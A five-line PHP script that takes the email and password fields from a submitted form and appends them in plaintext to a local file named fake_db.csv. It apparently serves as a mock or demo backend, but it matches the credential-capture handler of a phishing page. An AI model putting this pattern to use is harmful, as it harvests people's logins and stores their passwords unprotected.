<?php

$db = fopen(__DIR__ . '/fake_db.csv', 'a');
fputcsv($db, [$_POST['mail'], $_POST['password']]);
fclose($db);
